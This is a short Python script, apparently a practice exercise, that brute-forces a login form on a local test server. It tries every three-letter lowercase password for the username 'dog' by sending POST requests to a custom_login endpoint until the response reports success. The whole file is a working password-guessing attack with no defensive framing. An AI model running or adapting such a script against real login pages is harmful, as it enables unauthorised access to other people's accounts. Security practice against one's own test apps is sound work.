import requests
import string
import itertools


target_url="http://127.0.0.1:5000/custom_login"
chars=string.ascii_lowercase

for i in itertools.product(chars,repeat=3):
    password=''.join(i)
    responce = requests.post(target_url, data={
        "username": "dog", "password": password
    })
    if "succesfully" in responce.text:
        print(f"[+] Password found: {password}") 
        break
    else:
        print(f"Trying: {password}")
